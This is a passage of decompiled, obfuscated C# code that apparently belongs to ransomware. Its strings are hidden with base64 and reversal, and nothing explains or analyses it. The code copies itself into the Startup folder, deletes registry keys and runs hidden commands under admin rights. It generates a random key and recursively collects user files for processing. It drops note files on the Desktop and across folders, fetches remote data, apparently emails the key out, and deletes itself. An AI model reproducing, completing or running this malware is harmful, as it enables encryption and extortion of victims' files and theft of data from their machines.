			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + getString_0(107397138);
			string text2 = text + Path.GetFileName(fileName);
			if (APjcYBpyaaCnVsgh == getString_0(107396768) && fileName != text2)
			{
				Thread thread2 = new Thread(sKCIscqMPvCb);
				thread2.IsBackground = true;
				thread2.Priority = ThreadPriority.Normal;
				thread2.Start();
			}
			if (GDCYhuWfDwyNq == getString_0(107396768) && mainModule != null && fileName != text2)
			{
				try
				{
					dhLFyhDQAcxBwkEP = dnpQsdquzWk(0, NTmjnOoDFhsRo.Count);
					File.Copy(fileName, text + NTmjnOoDFhsRo[dhLFyhDQAcxBwkEP], overwrite: true);
					Process.Start(text + NTmjnOoDFhsRo[dhLFyhDQAcxBwkEP]);
					SgZfDvnvaAzME();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (nFbLIGlZufY == getString_0(107396768) && DateTime.Now < ytdAcOLjjYclpCEH)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (RQnfPUyabvkbjBQM == getString_0(107396768) && DateTime.Now > ZnXhduYGGrm)
			{
				SgZfDvnvaAzME();
			}
		}
		catch
		{
		}
		tqZEnBvzTSSB();
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegated == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegated = delegate
			{
				List<string> source = aVSgOyvOKixiOZhem;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate10 = delegate(string string_0)
					{
						jZJYIJgzyrqgig(getString_0(107389611), string_0);
					};
				}
				Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate10);
				List<string> source2 = qVSYqPqzFDgvw;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
					{
						jZJYIJgzyrqgig(getString_0(107389634), string_0);
					};
				}
				Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
				List<string> source3 = zXIdDQEuVwYo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), string_0);
					};
				}
				Parallel.ForEach(source3, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
				if (twaCZwLhmnIEaDXX == getString_0(107396768))
				{
					string[] source4 = pxwofrQHvBYQmc;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
						{
							jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389621)), getString_0(107389596) + string_0 + getString_0(107389555));
						};
					}
					Parallel.ForEach(source4, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
				}
				if (!QwrjqVpAtpM().Contains(getString_0(107390340)))
				{
					afZIDbbbfqB(ubHXHkwsTjIxkt);
				}
				else
				{
					List<string> source5 = tmHaEWqnXudg;
					if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
					{
						CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
						{
							jZJYIJgzyrqgig(UMsFeqgmECpmMQw(VgkfvqvnQmIYVv(getString_0(107389550))), string_0);
						};
					}
					Parallel.ForEach(source5, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
				}
				List<string> cygYQxkVcvLjEa = CygYQxkVcvLjEa;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
					{
						jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107389557)), string_0);
					};
				}
				Parallel.ForEach(cygYQxkVcvLjEa, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
				List<string> zJnGvhEgMPvKo = ZJnGvhEgMPvKo;
				if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
				{
					CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
					{
						jZJYIJgzyrqgig(getString_0(107390052), string_0);
					};
				}
				Parallel.ForEach(zJnGvhEgMPvKo, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
			};
		}
		Thread thread3 = new Thread(CS_0024_003C_003E9__CachedAnonymousMethodDelegated);
		thread3.Priority = ThreadPriority.Normal;
		thread3.IsBackground = true;
		thread3.Start();
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && OhwnJVvNAck)
			{
				try
				{
					Thread thread4 = new Thread(oPHxaGLBsZUWs.RNIUmbQzQKGf);
					thread4.IsBackground = true;
					thread4.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			jZJYIJgzyrqgig(getString_0(107397133), UMsFeqgmECpmMQw(getString_0(107397152)));
			jZJYIJgzyrqgig(getString_0(107397133), UMsFeqgmECpmMQw(getString_0(107397079)));
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107397022)), UMsFeqgmECpmMQw(getString_0(107396977)));
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107397022)), UMsFeqgmECpmMQw(getString_0(107396335)));
		}
		SecureString secureString = new SecureString();
		if (MnwIXccgUusgmGvAy == getString_0(107396225))
		{
			Random random = new Random();
			for (int i = 0; i < 32; i++)
			{
				char value = (char)(random.Next(48, 123) % 255);
				if ((Convert.ToInt32(value) >= 58 && Convert.ToInt32(value) <= 64) || (Convert.ToInt32(value) >= 91 && Convert.ToInt32(value) <= 96))
				{
					i--;
				}
				else
				{
					secureString.AppendChar(Convert.ToChar(value));
				}
			}
			mHfWrQyDyHEP = RhHGGkxKaJlh.PesTFjBOVNb(8);
			mHfWrQyDyHEP += RhHGGkxKaJlh.PesTFjBOVNb(8);
			mHfWrQyDyHEP += RhHGGkxKaJlh.PesTFjBOVNb(8);
			mHfWrQyDyHEP += RhHGGkxKaJlh.PesTFjBOVNb(8);
		}
		else
		{
			mHfWrQyDyHEP = getString_0(107396220);
		}
		oUoqPtPNHwCatJ = vMIKiIwtveyB.GfpVZvWzMIElkKF(hDFrvgTkEnDluY(secureString));
		if (kZHyFbeFNlI)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), oVFLPykEyliA)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), oVFLPykEyliA), string.Concat(UMsFeqgmECpmMQw(getString_0(107396655)), new WebClient().DownloadString(UMsFeqgmECpmMQw(getString_0(107396662))), getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107396584)), DateTime.Now, getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107396575)), oUoqPtPNHwCatJ));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), oVFLPykEyliA), getString_0(107396486) + oUoqPtPNHwCatJ);
				}
			}
			catch (Exception ex7)
			{
				if (TfpcYTfYwiZ)
				{
					try
					{
						File.AppendAllText(XTpFtiqHigTwzn, getString_0(107396457) + ex7.Message + getString_0(107396589));
					}
					catch (Exception)
					{
					}
				}
			}
		}
		KKMXRyDtfjuqDT.KfgJttiXhPPuPC(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), vRtRaLVWxUWQ), EDZVksKGWyQ(oUoqPtPNHwCatJ), null, null, getString_0(107395928), getString_0(107395879), null);
		try
		{
			SKzcqYVvCfvHJUMP(new string[1] { getString_0(107395894) }, new string[100]
			{
				getString_0(107395853),
				getString_0(107395848),
				getString_0(107395875),
				getString_0(107395866),
				getString_0(107395861),
				getString_0(107395824),
				getString_0(107395819),
				getString_0(107395814),
				getString_0(107395841),
				getString_0(107395836),
				getString_0(107395831),
				getString_0(107395794),
				getString_0(107395785),
				getString_0(107395812),
				getString_0(107395803),
				getString_0(107395798),
				getString_0(107395761),
				getString_0(107395756),
				getString_0(107395751),
				getString_0(107395778),
				getString_0(107395769),
				getString_0(107395732),
				getString_0(107395727),
				getString_0(107395722),
				getString_0(107395717),
				getString_0(107395744),
				getString_0(107395739),
				getString_0(107395734),
				getString_0(107395697),
				getString_0(107395692),
				getString_0(107395687),
				getString_0(107395714),
				getString_0(107395709),
				getString_0(107395704),
				getString_0(107396175),
				getString_0(107396170),
				getString_0(107396165),
				getString_0(107396192),
				getString_0(107395819),
				getString_0(107396187),
				getString_0(107395841),
				getString_0(107396146),
				getString_0(107396141),
				getString_0(107396136),
				getString_0(107396163),
				getString_0(107396158),
				getString_0(107396153),
				getString_0(107396116),
				getString_0(107396111),
				getString_0(107396106),
				getString_0(107396101),
				getString_0(107396128),
				getString_0(107396123),
				getString_0(107396118),
				getString_0(107396081),
				getString_0(107396076),
				getString_0(107396071),
				getString_0(107396098),
				getString_0(107396089),
				getString_0(107396052),
				getString_0(107396043),
				getString_0(107396062),
				getString_0(107396187),
				getString_0(107396017),
				getString_0(107396008),
				getString_0(107396031),
				getString_0(107396022),
				getString_0(107395981),
				getString_0(107396004),
				getString_0(107395999),
				getString_0(107395990),
				getString_0(107395949),
				getString_0(107395972),
				getString_0(107395967),
				getString_0(107395962),
				getString_0(107395957),
				getString_0(107395408),
				getString_0(107395403),
				getString_0(107395398),
				getString_0(107395421),
				getString_0(107395416),
				getString_0(107395379),
				getString_0(107395374),
				getString_0(107395369),
				getString_0(107395396),
				getString_0(107395387),
				getString_0(107395346),
				getString_0(107395341),
				getString_0(107395709),
				getString_0(107395336),
				getString_0(107395363),
				getString_0(107395358),
				getString_0(107395353),
				getString_0(107395316),
				getString_0(107395307),
				getString_0(107395302),
				getString_0(107395329),
				getString_0(107395320),
				getString_0(107395283),
				getString_0(107395278)
			}, new string[0], hDFrvgTkEnDluY(secureString), getString_0(107395273));
		}
		catch
		{
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		mHfWrQyDyHEP = RhHGGkxKaJlh.PesTFjBOVNb(32);
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292)))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292));
				streamWriter.WriteLine(UMsFeqgmECpmMQw(getString_0(107395255)));
				streamWriter.WriteLine(getString_0(107396589));
				streamWriter.WriteLine(UMsFeqgmECpmMQw(getString_0(107392293)));
				streamWriter.WriteLine(oUoqPtPNHwCatJ);
				if (kPvytyWmXkPBKlYej == getString_0(107396225))
				{
					streamWriter.WriteLine(getString_0(107396589));
					streamWriter.WriteLine(UMsFeqgmECpmMQw(getString_0(107392292)) + Convert.ToString(yPXLGtMRJTLFe.Count));
				}
			}
			else
			{
				File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292), getString_0(107392215) + oUoqPtPNHwCatJ);
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in NnXnVroauy)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395292)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292), item + getString_0(107395292), overwrite: true);
				}
				else
				{
					File.AppendAllText(item + getString_0(107395292), getString_0(107392215) + oUoqPtPNHwCatJ);
				}
			}
			catch (Exception)
			{
			}
			if (!kaofbiRznaot && num > 10)
			{
				break;
			}
		}
		if (yyUmWvysfpc == getString_0(107396768))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392186)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392186));
					streamWriter2.WriteLine(UMsFeqgmECpmMQw(getString_0(107392149)));
					streamWriter2.WriteLine(getString_0(107396589));
					streamWriter2.WriteLine(UMsFeqgmECpmMQw(getString_0(107392132)));
					streamWriter2.WriteLine(oUoqPtPNHwCatJ + UMsFeqgmECpmMQw(getString_0(107392523)));
					if (kPvytyWmXkPBKlYej == getString_0(107396225))
					{
						streamWriter2.WriteLine(getString_0(107396589));
						streamWriter2.WriteLine(UMsFeqgmECpmMQw(getString_0(107392542)) + UMsFeqgmECpmMQw(getString_0(107392292)) + Convert.ToString(yPXLGtMRJTLFe.Count) + UMsFeqgmECpmMQw(getString_0(107392523)));
					}
				}
				else
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392186), UMsFeqgmECpmMQw(getString_0(107392542)) + getString_0(107392215) + oUoqPtPNHwCatJ + UMsFeqgmECpmMQw(getString_0(107392523)));
				}
			}
			catch
			{
			}
		}
		if (xsOPJPlgcqHwrV == getString_0(107396768))
		{
			try
			{
				if (kPvytyWmXkPBKlYej == getString_0(107396225))
				{
					ZTOrHfhPbpGY.wrwlEKykDmsYULM(getString_0(107392481), getString_0(107392476), getString_0(107392431), string.Concat(UMsFeqgmECpmMQw(getString_0(107396655)), new WebClient().DownloadString(UMsFeqgmECpmMQw(getString_0(107396662))), getString_0(107392422), UMsFeqgmECpmMQw(getString_0(107396584)), DateTime.Now, getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107392449)), Convert.ToString(yPXLGtMRJTLFe.Count), getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107396575)), oUoqPtPNHwCatJ));
				}
				else
				{
					ZTOrHfhPbpGY.wrwlEKykDmsYULM(getString_0(107392481), getString_0(107392476), getString_0(107392431), string.Concat(UMsFeqgmECpmMQw(getString_0(107396655)), new WebClient().DownloadString(UMsFeqgmECpmMQw(getString_0(107396662))), getString_0(107392422), UMsFeqgmECpmMQw(getString_0(107396584)), DateTime.Now, getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107392449)), Convert.ToString(yPXLGtMRJTLFe.Count), getString_0(107396589), UMsFeqgmECpmMQw(getString_0(107396575)), oUoqPtPNHwCatJ));
				}
			}
			catch
			{
			}
		}
		if (zPkDxLdFtqsabg == getString_0(107396768))
		{
			try
			{
				ltGaSWAsdGxV.TQUUSwMMqKgdp(new Uri(getString_0(107392368)));
			}
			catch
			{
			}
		}
		if (yyUmWvysfpc == getString_0(107396225))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292)))
				{
					Process.Start(UMsFeqgmECpmMQw(getString_0(107392367)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395292));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392186)))
				{
					Process.Start(UMsFeqgmECpmMQw(getString_0(107392374)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107392186));
				}
			}
			catch
			{
			}
		}
		if (!string.IsNullOrEmpty(NbphLPFvGkuDBm))
		{
			try
			{
				File.Delete(NbphLPFvGkuDBm);
			}
			catch
			{
			}
		}
		if (HUFUXAJeqIWSXcOELF == getString_0(107391813))
		{
			SgZfDvnvaAzME();
		}
	}

	public static void sKCIscqMPvCb()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(UMsFeqgmECpmMQw(getString_0(107391836)), UMsFeqgmECpmMQw(getString_0(107391682)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int dnpQsdquzWk(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> UAZMQOYQxIr(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains(getString_0(107391633)) && !text.ToLower().Contains(getString_0(107391644)) && !text.ToLower().Contains(getString_0(107391599)) && !text.ToLower().Contains(getString_0(107391618)) && !text.ToLower().Contains(getString_0(107392073)) && !text.ToLower().Contains(getString_0(107392052)) && !text.ToLower().Contains(getString_0(107392039)) && !text.ToLower().Contains(getString_0(107392058)) && !text.ToLower().Contains(getString_0(107392021)) && !text.ToLower().Contains(getString_0(107391980)) && !text.ToLower().Contains(getString_0(107391995)) && !text.ToLower().Contains(getString_0(107392052)) && !text.ToLower().Contains(getString_0(107391950)) && !text.ToLower().Contains(getString_0(107391961)))
				{
					array = Directory.GetFiles(text);
					goto IL_01eb;
				}
			}
			catch
			{
			}
			continue;
			IL_01eb:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107391936)) && !fileInfo.FullName.Contains(getString_0(107391887)) && !fileInfo.FullName.Contains(getString_0(107391902)) && !fileInfo.FullName.Contains(getString_0(107391853)) && !fileInfo.FullName.Contains(getString_0(107391868)) && !fileInfo.FullName.Contains(getString_0(107391307)) && !fileInfo.FullName.Contains(getString_0(107391322)) && !fileInfo.FullName.Contains(getString_0(107391273)) && !fileInfo.FullName.Contains(getString_0(107391292)) && !fileInfo.FullName.Contains(getString_0(107391239)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391258)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391213)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391228)) && !fileInfo.FullName.ToLower().Contains(getString_0(107391179)) && !fileInfo.FullName.Contains(UMsFeqgmECpmMQw(getString_0(107391194))) && !fileInfo.FullName.Contains(getString_0(107391169)) && !fileInfo.FullName.Contains(getString_0(107391124)) && !fileInfo.FullName.EndsWith(getString_0(107395273)) && !fileInfo.FullName.EndsWith(getString_0(107391127)) && !fileInfo.FullName.EndsWith(getString_0(107391090)) && !fileInfo.FullName.EndsWith(getString_0(107391085)) && !fileInfo.FullName.EndsWith(getString_0(107391080)) && !fileInfo.FullName.Contains(getString_0(107391107)) && !fileInfo.FullName.Contains(vRtRaLVWxUWQ) && !fileInfo.FullName.Contains(XTpFtiqHigTwzn) && !fileInfo.FullName.Contains(oVFLPykEyliA))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(fKoTDIHCrS) * 1024.0 * 1024.0 && YTHZdrAysCSCqJCP == getString_0(107396768))
						{
							list.Add(fileInfo.FullName);
							ohQxWeMSXPVib(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && YTHZdrAysCSCqJCP == getString_0(107396225))
						{
							list.Add(fileInfo.FullName);
							ohQxWeMSXPVib(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string jZJYIJgzyrqgig(string tmjEwktexJwRLldK = "", string ogwzWmzjEtTIe = "")
	{
		string result = getString_0(107392368);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = tmjEwktexJwRLldK,
				Arguments = ogwzWmzjEtTIe,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void EUkhrFVIlAr(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107391570),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string VgkfvqvnQmIYVv(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string UMsFeqgmECpmMQw(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void afZIDbbbfqB(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = UMsFeqgmECpmMQw(getString_0(107391585));
		processStartInfo.Arguments = getString_0(107391556) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool HjhRarxRXLl(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ulqCrCCNbcfUQk(string string_0)
	{
		try
		{
			cbCGHgGAwROs CS_0024_003C_003E8__locals0 = new cbCGHgGAwROs();
			DriveInfo[] drives = DriveInfo.GetDrives();
			CS_0024_003C_003E8__locals0.zSOeZtQNCBsZV = Path.GetPathRoot(string_0);
			DriveInfo driveInfo = drives.FirstOrDefault((DriveInfo driveInfo_0) => driveInfo_0.RootDirectory.Name == CS_0024_003C_003E8__locals0.zSOeZtQNCBsZV);
			return driveInfo != null && driveInfo.DriveFormat == getString_0(107391551);
		}
		catch
		{
			return false;
		}
	}

	public static string hDFrvgTkEnDluY(SecureString secureString_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void tqZEnBvzTSSB()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = VgkfvqvnQmIYVv(getString_0(107391542));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(UMsFeqgmECpmMQw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107391372)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107391347)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107391362)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390793)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107391585)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390768)));
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390739)));
					registryKey.Close();
				}
				string_ = VgkfvqvnQmIYVv(getString_0(107390754));
				registryKey = Registry.LocalMachine.OpenSubKey(UMsFeqgmECpmMQw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390657)));
					registryKey.Close();
				}
				string_ = VgkfvqvnQmIYVv(getString_0(107390608));
				registryKey = Registry.LocalMachine.OpenSubKey(UMsFeqgmECpmMQw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390657)));
					registryKey.Close();
				}
				string_ = VgkfvqvnQmIYVv(getString_0(107390608));
				registryKey = Registry.CurrentUser.OpenSubKey(UMsFeqgmECpmMQw(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(UMsFeqgmECpmMQw(getString_0(107390657)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107390623)), UMsFeqgmECpmMQw(getString_0(107390574)));
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107391069)), UMsFeqgmECpmMQw(getString_0(107391028)));
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107391069)), UMsFeqgmECpmMQw(getString_0(107390914)));
			jZJYIJgzyrqgig(UMsFeqgmECpmMQw(getString_0(107390821)), UMsFeqgmECpmMQw(getString_0(107390292)));
		}
		catch
		{
		}
	}

	public static void LvqQiyYFTFKfLYz(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(UMsFeqgmECpmMQw(getString_0(107390219)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void SgZfDvnvaAzME()
	{
		jZJYIJgzyrqgig(getString_0(107397133), UMsFeqgmECpmMQw(getString_0(107390194)));
		string text = UMsFeqgmECpmMQw(getString_0(107390512));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390447) + text + getString_0(107390447) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107397133);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void AXKQsmCJUmCYzKL(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(XTpFtiqHigTwzn, getString_0(107390442) + string_0 + getString_0(107390465) + ex.Message + getString_0(107396589));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string QwrjqVpAtpM()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107392368);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390344);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390399))) ? getString_0(107390349) : getString_0(107390390));
				break;
			case 0:
				text = getString_0(107390404);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390371);
				break;
			case 4:
				text = getString_0(107390358);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390340) : getString_0(107390317));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107389772) : getString_0(107389777)) : getString_0(107390326)) : getString_0(107390335));
				break;
			case 10:
				text = getString_0(107389767);
				break;
			}
		}
		if (text != getString_0(107392368))
		{
			text = getString_0(107389794) + text;
			if (oSVersion.ServicePack != getString_0(107392368))
			{
				text = text + getString_0(107389781) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string EDZVksKGWyQ(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395292);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(UMsFeqgmECpmMQw(getString_0(107395255)));
				streamWriter.WriteLine(getString_0(107396589));
				streamWriter.WriteLine(UMsFeqgmECpmMQw(getString_0(107392293)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107392215) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (TfpcYTfYwiZ)
			{
				try
				{
					File.AppendAllText(XTpFtiqHigTwzn, getString_0(107389744) + ex.Message + getString_0(107396589));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void SKzcqYVvCfvHJUMP(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		hslKqmAALJBlfcK.ljwynMyzEvwgD CS_0024_003C_003E8__locals0 = new hslKqmAALJBlfcK();
		CS_0024_003C_003E8__locals0.CYhMazIAaeOTM = string_1;
		CS_0024_003C_003E8__locals0.ionjNPkCCEVsfJ = string_2;
		CS_0024_003C_003E8__locals0.weIWMSlCLCiXZYm = string_3;
		CS_0024_003C_003E8__locals0.TuyIOFIBHopjl = string_4;
		UCLDIbRwOFSI = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.weIWMSlCLCiXZYm);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395894))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
